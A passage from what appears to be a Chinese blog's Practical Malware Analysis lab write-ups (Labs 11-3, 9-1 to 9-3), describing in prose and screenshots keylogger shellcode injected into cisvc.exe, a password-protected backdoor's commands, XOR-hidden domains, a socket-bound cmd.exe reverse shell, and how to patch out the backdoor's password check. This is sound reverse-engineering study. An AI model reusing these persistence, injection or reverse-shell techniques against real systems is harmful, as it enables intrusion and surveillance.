title="8..ini文件的意义是什么？"></a>8..ini文件的意义是什么？</h3><p>存储机密过后的恶意电子邮件地址，用来读取解密。</p><h3 id="9-你怎样用wireshark动态抓取这个恶意代码的行为？"><a href="#9-你怎样用wireshark动态抓取这个恶意代码的行为？" class="headerlink" title="9.你怎样用wireshark动态抓取这个恶意代码的行为？"></a>9.你怎样用wireshark动态抓取这个恶意代码的行为？</h3><p>可以查看与邮件相关的数据包来进行分析。</p><h2 id="Lab-11-3"><a href="#Lab-11-3" class="headerlink" title="Lab 11-3"></a>Lab 11-3</h2><p>此实验最好在XP中进行，win7运行没有cisvc.exe。</p><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>分析程序，可以看到首先复制了文件，之后调用了sub401070</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-1.png"></p><p>然后经过分析是将一段shellcode注入到cisvc.exe中。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-2.png"></p><p>之后就是执行了CMD命令，net start cisvc</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-9.png"></p><p>可以通过工具看到注入前后的入口点明显发生了变化</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-3.png"></p><p>分析shellcode发现主要是调用了恶意DLL中的函数zzz69806582</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-4.png"></p><p>分析DLL，查看这个导出函数看到它创建了一个新的线程。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-5.png"></p><p>继续分析新线程，打开发现其创建了一个互斥量防止重复运行，然后创建一个C:\WINDOWS\System32\kernel64x.dll文件，然后是键盘记录功能。记录在创建的文件之中。</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-6.png"></p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-7.png"></p><p>记录的一些信息</p><p><img src="/2021/09/07/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C11/3-8.png"></p><h3 id="1-使用基础的静态分析过程，你可以发现什么有趣的线索？"><a href="#1-使用基础的静态分析过程，你可以发现什么有趣的线索？" class="headerlink" title="1.使用基础的静态分析过程，你可以发现什么有趣的线索？"></a>1.使用基础的静态分析过程，你可以发现什么有趣的线索？</h3><p>可以看到其中的字符串和一些API，字符串有cmd.exe猜测其启用了cmd，DLL中的导入表有GetAsyncKeyState，猜测可能有键盘记录。</p><h3 id="2-当运行这个恶意代码时，发生了什么？"><a href="#2-当运行这个恶意代码时，发生了什么？" class="headerlink" title="2.当运行这个恶意代码时，发生了什么？"></a>2.当运行这个恶意代码时，发生了什么？</h3><p>会进行键盘的记录</p><h3 id="3-Lab11-03-exe如何安装Lab11-03-dll使其长期驻留？"><a href="#3-Lab11-03-exe如何安装Lab11-03-dll使其长期驻留？" class="headerlink" title="3.Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？"></a>3.Lab11-03.exe如何安装Lab11-03.dll使其长期驻留？</h3><p>将其复制在了system32目录下，然后还向cisvc.exe注入了shellcode，使其加载恶意DLL的导出函数实现键盘记录。</p><h3 id="4-这个恶意代码感染windows系统的哪个文件？"><a href="#4-这个恶意代码感染windows系统的哪个文件？" class="headerlink" title="4.这个恶意代码感染windows系统的哪个文件？"></a>4.这个恶意代码感染windows系统的哪个文件？</h3><p>cisvc.exe</p><h3 id="5-Lab11-03-dll做了什么？"><a href="#5-Lab11-03-dll做了什么？" class="headerlink" title="5.Lab11-03.dll做了什么？"></a>5.Lab11-03.dll做了什么？</h3><p>创建了dll文件，在其中进行键盘记录</p><h3 id="6-这个恶意代码将收集的数据存放在何处？"><a href="#6-这个恶意代码将收集的数据存放在何处？" class="headerlink" title="6.这个恶意代码将收集的数据存放在何处？"></a>6.这个恶意代码将收集的数据存放在何处？</h3><p>C:\WINDOWS\System32\kernel64x.dll之中</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验9</title>
    <link href="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/"/>
    <url>/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-9-1"><a href="#Lab-9-1" class="headerlink" title="Lab 9-1"></a>Lab 9-1</h2><h3 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h3><p>打开程序，首先看到判断当前程序是否带了参数，如果带了参数，就进行后面的操作，如果没有带参数，会尝试打开一个键值，如果不存在此键值，则程序自删除，如果存在就会开始和服务器端通信，这些后面再说。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.1.png"></p><p>之后会进行判断，首先判断当前输入的最后一个参数是否等于abcd。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.2.png"></p><p>然后就是判断输入的第一个参数是什么，-in,-re,-c,-cc。</p><h4 id="in"><a href="#in" class="headerlink" title="-in"></a>-in</h4><p>-in参数，首先创建了一个系统服务</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.3.png"></p><p>然后将自身复制到system32下</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.4.png"></p><p>然后创建注册表表项，并且设置键值</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.5.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.6.png"></p><p>恶意代码安装的服务</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.7.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.8.png"></p><p>设置的键值</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.12.png"></p><h4 id="re"><a href="#re" class="headerlink" title="-re"></a>-re</h4><p>-re参数是删除配置信息，将服务删除，复制的文件删除，注册表信息也清空。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.9.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.10.png"></p><p>刚才创建的键值已经被删除</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.11.png"></p><h4 id="c"><a href="#c" class="headerlink" title="-c"></a>-c</h4><p>-c参数是设置自己的配置信息，根据-c后面的四个参数进行设置</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.13.png"></p><p>输入1 2 3 4</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.14.png"></p><h4 id="cc"><a href="#cc" class="headerlink" title="-cc"></a>-cc</h4><p>-cc 是打印当前的配置信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.15.png"></p><p>打印出来的信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.16.png"></p><p>如果参数不符合要求都会进行自删除</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.17.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.18.png"></p><h4 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h4><p>不带任何参数，且有配置信息的情况下，会执行连接服务器，并且根据服务器指令执行操作。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.19.png"></p><p>获取注册表中的配置信息</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.20.png"></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.21.png"></p><p>指令共有五种，分别是sleep，upload，download，CMD，nothing</p><h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h5><p>会执行sleep函数</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.22.png"></p><h5 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h5><p>是下载一个文件</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.23.png"></p><h5 id="download"><a href="#download" class="headerlink" title="download"></a>download</h5><p>发送内容</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.24.png"></p><h5 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h5><p>会执行一个命令</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.25.png"></p><h5 id="nothing"><a href="#nothing" class="headerlink" title="nothing"></a>nothing</h5><p>什么都不做</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.26.png"></p><h3 id="1-如何让这个恶意代码安装自身？"><a href="#1-如何让这个恶意代码安装自身？" class="headerlink" title="1.如何让这个恶意代码安装自身？"></a>1.如何让这个恶意代码安装自身？</h3><p>从上数分析可以知道，需要使用-in选项。</p><h3 id="2-这个恶意代码的命令行选项是什么？它要求的密码是什么？"><a href="#2-这个恶意代码的命令行选项是什么？它要求的密码是什么？" class="headerlink" title="2.这个恶意代码的命令行选项是什么？它要求的密码是什么？"></a>2.这个恶意代码的命令行选项是什么？它要求的密码是什么？</h3><p>命令行选项有四种,-in,-re,-c,-cc密码是abcd</p><h3 id="3-如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码"><a href="#3-如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码" class="headerlink" title="3.如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码"></a>3.如何利用OD永久修补这个恶意代码，使其不需要指定的命令行密码</h3><p>修改跳转条件即可，这只是其中的一种方法，将JNZ修改为JMP。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-1.27.png"></p><h3 id="4-这个恶意代码基于系统的特征是什么？"><a href="#4-这个恶意代码基于系统的特征是什么？" class="headerlink" title="4.这个恶意代码基于系统的特征是什么？"></a>4.这个恶意代码基于系统的特征是什么？</h3><p>本地创建的名为Lab9-01的服务，还创建了一个XPS表项，其中的键值是连接所需的参数。</p><h3 id="5-这个恶意代码通过网络命令执行了哪些不同操作？"><a href="#5-这个恶意代码通过网络命令执行了哪些不同操作？" class="headerlink" title="5.这个恶意代码通过网络命令执行了哪些不同操作？"></a>5.这个恶意代码通过网络命令执行了哪些不同操作？</h3><p>上述分析已经分析清楚。</p><h3 id="6-这个恶意代码是否有网络特征？"><a href="#6-这个恶意代码是否有网络特征？" class="headerlink" title="6.这个恶意代码是否有网络特征？"></a>6.这个恶意代码是否有网络特征？</h3><p>有网络的连接，域名是<a href="http://www.practicalmalwareanalysis.com/">http://www.practicalmalwareanalysis.com</a></p><h2 id="Lab-9-2"><a href="#Lab-9-2" class="headerlink" title="Lab 9-2"></a>Lab 9-2</h2><h3 id="详细分析-1"><a href="#详细分析-1" class="headerlink" title="详细分析"></a>详细分析</h3><p>程序的整体流程比较简单。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.1.png"></p><p>首先程序会进行比较，比较当前运行的程序是否是ocl.exe</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.2.png"></p><p>然后会在401089函数中进行解密，是一个异或解密。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.3.png"></p><p>解密后的域名</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.4.png"></p><p>之后会连接域名，然后会调用401000，在其中创建了一个进程</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.5.png"></p><h3 id="1-在二进制文件中，你看到的静态字符串是什么？"><a href="#1-在二进制文件中，你看到的静态字符串是什么？" class="headerlink" title="1.在二进制文件中，你看到的静态字符串是什么？"></a>1.在二进制文件中，你看到的静态字符串是什么？</h3><p>只能看到这些字符串</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.6.png"></p><h3 id="2-当你运行这个二进制文件时，会发生什么？"><a href="#2-当你运行这个二进制文件时，会发生什么？" class="headerlink" title="2.当你运行这个二进制文件时，会发生什么？"></a>2.当你运行这个二进制文件时，会发生什么？</h3><p>不会发生什么，应该是会创建一个CMD进程。</p><h3 id="3-怎样让恶意代码的攻击负载（payload）获得运行？"><a href="#3-怎样让恶意代码的攻击负载（payload）获得运行？" class="headerlink" title="3.怎样让恶意代码的攻击负载（payload）获得运行？"></a>3.怎样让恶意代码的攻击负载（payload）获得运行？</h3><p>将名字改为ocl.exe</p><h3 id="4-在地址0x00401133处发生了什么？"><a href="#4-在地址0x00401133处发生了什么？" class="headerlink" title="4.在地址0x00401133处发生了什么？"></a>4.在地址0x00401133处发生了什么？</h3><p>将一些数据赋值给一个地址，主要是为了隐藏字符串，这也是为什么刚才字符串窗口并没有什么有用的信息，shellcode的编写手法之一，可以参考<a href="https://b1ackie.cn/2021/07/22/shellcode%E5%AD%A6%E4%B9%A0/">shellcode学习 </a></p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.7.png"></p><h3 id="5-传递个子例程（函数）0x00401089的参数是什么？"><a href="#5-传递个子例程（函数）0x00401089的参数是什么？" class="headerlink" title="5.传递个子例程（函数）0x00401089的参数是什么？"></a>5.传递个子例程（函数）0x00401089的参数是什么？</h3><p>是这两个参数，其中一个是加密的字符串</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.8.png"></p><p>另一个是用来进行异或解密的数据</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-2.9.png"></p><h3 id="6-恶意代码使用的域名是什么？"><a href="#6-恶意代码使用的域名是什么？" class="headerlink" title="6.恶意代码使用的域名是什么？"></a>6.恶意代码使用的域名是什么？</h3><p><a href="http://www.practicalmalwareanalysis.com/">www.practicalmalwareanalysis.com</a></p><h3 id="7-恶意代码使用什么编码函数来混淆域名？"><a href="#7-恶意代码使用什么编码函数来混淆域名？" class="headerlink" title="7.恶意代码使用什么编码函数来混淆域名？"></a>7.恶意代码使用什么编码函数来混淆域名？</h3><p>异或</p><h3 id="8-恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？"><a href="#8-恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？" class="headerlink" title="8.恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？"></a>8.恶意代码在0x0040106E处调用CreateProcessA函数的意义是什么？</h3><p>这块用书上的话来说是一个反向的SHELL，</p><p>书上的原话：</p><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos">STARTUPINFO结构中的标准流被设置为一个套接字。这直接绑定套接字和<span class="hljs-built_in">cmd</span>.exe的标准流，所以<span class="hljs-built_in">cmd</span>.exe被启动后，所有经过套接字的数据都将发送到<span class="hljs-built_in">cmd</span>.exe，并且<span class="hljs-built_in">cmd</span>.exe产生的所有输出都将通过套接字发出。<br></code></pre></div></td></tr></table></figure><p>这里我并没有分析出来，就借用了书上的解答。</p><h2 id="Lab-9-3"><a href="#Lab-9-3" class="headerlink" title="Lab 9-3"></a>Lab 9-3</h2><h3 id="详细分析-2"><a href="#详细分析-2" class="headerlink" title="详细分析"></a>详细分析</h3><p>整体流程也是比较简单的，可以看到首先是调用了三个DLL中的函数，然后是writefile函数向某文件写入数据。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.1.png"></p><p>运行DLL主要会打印出这三行信息，下面来仔细分析一下到底做了什么。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.2.png"></p><h4 id="DLL1"><a href="#DLL1" class="headerlink" title="DLL1"></a>DLL1</h4><p>先来看看第一个DLL。</p><p>可以看到这是DLL1Print函数，其中dword_10008030就是打印的数据，可以查看交叉引用，看看究竟是什么。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.3.png"></p><p>可以看到这个值是当前进程的PID</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.4.png"></p><h4 id="DLL2"><a href="#DLL2" class="headerlink" title="DLL2"></a>DLL2</h4><p>再来看第二个DLL，这是导出函数 DLL2Print，看到dword_1000B078是其打印的数据，还是交叉引用查看。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.5.png"></p><p>可以看到是这个数据是创建文件的句柄。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.6.png"></p><p>而另一个导出函数DLL2ReturnJ可以看到返回了一个值，从上图可以看到这个值就是文件的句柄。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.7.png"></p><h4 id="DLL3"><a href="#DLL3" class="headerlink" title="DLL3"></a>DLL3</h4><p>DLL3有两个导出函数</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.8.png"></p><p>DLL3Print打印信息，可以看到是&amp;WideCharStr，交叉引用查看。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.9.png"></p><p>可以看到这是MultiByteToWideChar函数的一个参数，而这个参数作用是</p><figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">lpMultiByteStr</span><br>指向要转换的字符串的指针。<br></code></pre></div></td></tr></table></figure><p>这个函数作用是将字符串映射到 UTF-16（宽字符）字符串，也就是&amp;WideCharStr这其中保存着转为宽字符后的数据的地址。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.10.png"></p><p>导出函数DLL3GetStructure返回了一个值，从上图可以看出，这里其实是返回了一个结构体的地址。</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.11.png"></p><h3 id="1-Lab9-3-exe导入了哪些DLL？"><a href="#1-Lab9-3-exe导入了哪些DLL？" class="headerlink" title="1.Lab9-3.exe导入了哪些DLL？"></a>1.Lab9-3.exe导入了哪些DLL？</h3><p>导入了四个DLL</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.12.png"></p><h3 id="2-DLL1-dll、DLL2-dll、DLL3-dll要求的基址是多少？"><a href="#2-DLL1-dll、DLL2-dll、DLL3-dll要求的基址是多少？" class="headerlink" title="2.DLL1.dll、DLL2.dll、DLL3.dll要求的基址是多少？"></a>2.DLL1.dll、DLL2.dll、DLL3.dll要求的基址是多少？</h3><p>都是10000000</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.13.png"></p><h3 id="3-当使用OD调试时，为DLL1-dll、DLL2-dll、DLL3-dll分配的基址是什么？"><a href="#3-当使用OD调试时，为DLL1-dll、DLL2-dll、DLL3-dll分配的基址是什么？" class="headerlink" title="3.当使用OD调试时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基址是什么？"></a>3.当使用OD调试时，为DLL1.dll、DLL2.dll、DLL3.dll分配的基址是什么？</h3><p>分别是200000,、210000、220000</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.14.png"></p><h3 id="4-当调用DLL1-dll中的一个导入函数时，这个导入函数都做了些什么？"><a href="#4-当调用DLL1-dll中的一个导入函数时，这个导入函数都做了些什么？" class="headerlink" title="4.当调用DLL1.dll中的一个导入函数时，这个导入函数都做了些什么？"></a>4.当调用DLL1.dll中的一个导入函数时，这个导入函数都做了些什么？</h3><p>打印出了当前的进程的PID</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.15.png"></p><h3 id="5-当调用writefile函数时，写入的文件名是什么？"><a href="#5-当调用writefile函数时，写入的文件名是什么？" class="headerlink" title="5.当调用writefile函数时，写入的文件名是什么？"></a>5.当调用writefile函数时，写入的文件名是什么？</h3><p>temp.txt</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.16.png"></p><h3 id="6-当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？"><a href="#6-当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？" class="headerlink" title="6.当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？"></a>6.当调用NetScheduleJobAdd创建一个job时，从哪里获取第二个参数的数据？</h3><p>从DLL3中的DLL3GetStructure获取</p><p><img src="/2021/09/01/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C9/lab9-3.17.png"></p><h3 id="7-在运行或调试时，会看到程序打印出三块神秘数据。DLL1-dll、DLL2-dll、DLL3-dll它们的神秘数据分别什么？"><a href="#7-在运行或调试时，会看到程序打印出三块神秘数据。DLL1-dll、DLL2-dll、DLL3-dll它们的神秘数据分别什么？" class="headerlink" title="7.在运行或调试时，会看到程序打印出三块神秘数据。DLL1.dll、DLL2.dll、DLL3.dll它们的神秘数据分别什么？"></a>7.在运行或调试时，会看到程序打印出三块神秘数据。DLL1.dll、DLL2.dll、DLL3.dll它们的神秘数据分别什么？</h3><p>前面详细分析可知，第一个是当前进程的PID，第二个是文件句柄，第三个是保存着宽字符数据的地址。</p><h3 id="8-如何将DLL2-dll加载到IDA-PRO中，使得它与OD使用的加载地址匹配？"><a 